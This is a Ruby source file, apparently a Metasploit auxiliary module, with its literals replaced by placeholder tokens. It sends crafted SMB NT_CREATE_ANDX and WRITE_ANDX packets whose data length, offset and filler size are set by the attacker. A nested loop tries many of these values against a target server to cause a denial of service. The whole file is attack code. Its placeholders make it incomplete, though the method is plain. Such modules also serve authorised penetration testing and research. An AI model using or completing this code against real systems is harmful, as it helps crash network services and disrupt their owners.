class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: SMB :: Client include Msf :: Auxiliary :: Dos def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] ) ) end def send_smb_pkt ( dlenlow , doffset , fillersize ) connect ( ) smb_login ( ) pkt = CONST :: SMB_CREATE_PKT . make_struct pkt [ <str> ] [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] [ <str> ] . v [ <str> ] = simple . client . multiplex_id . to_i pkt [ <str> ] [ <str> ] . v [ <str> ] = simple . client . last_tree_id . to_i pkt [ <str> ] [ <str> ] . v [ <str> ] = simple . client . auth_user_id . to_i pkt [ <str> ] [ <str> ] . v [ <str> ] = simple . client . process_id . to_i pkt [ <str> ] [ <str> ] . v [ <str> ] = CONST :: SMB_COM_NT_CREATE_ANDX pkt [ <str> ] [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = <str> + <str> simple . client . smb_send ( pkt . to_s ) ack = simple . client . smb_recv_parse ( CONST :: SMB_COM_NT_CREATE_ANDX ) pkt = CONST :: SMB_WRITE_PKT . make_struct data_offset = pkt . to_s . length - <int> filler = Rex :: Text . rand_text ( fillersize ) pkt [ <str> ] [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] [ <str> ] . v [ <str> ] = simple . client . multiplex_id . to_i pkt [ <str> ] [ <str> ] . v [ <str> ] = simple . client . last_tree_id . to_i pkt [ <str> ] [ <str> ] . v [ <str> ] = simple . client . auth_user_id . to_i pkt [ <str> ] [ <str> ] . v [ <str> ] = simple . client . process_id . to_i pkt [ <str> ] [ <str> ] . v [ <str> ] = CONST :: SMB_COM_WRITE_ANDX pkt [ <str> ] [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] . v [ <str> ] = ack [ <str> ] . v [ <str> ] pkt [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = - <int> pkt [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = fillersize pkt [ <str> ] . v [ <str> ] = <int> pkt [ <str> ] . v [ <str> ] = dlenlow pkt [ <str> ] . v [ <str> ] = doffset pkt [ <str> ] . v [ <str> ] = <hex> pkt [ <str> ] . v [ <str> ] = fillersize pkt [ <str> ] . v [ <str> ] = filler simple . client . smb_send ( pkt . to_s ) end def run print_line ( <str> ) k = <int> j = <hex> while j > <int> i = <hex> while i > <int> begin print_line ( <str> i <str> j <str> k <str> ) send_smb_pkt ( i , j , k ) rescue print_line ( <str> ) end i = i - <int> end j = j - <int> end end end 
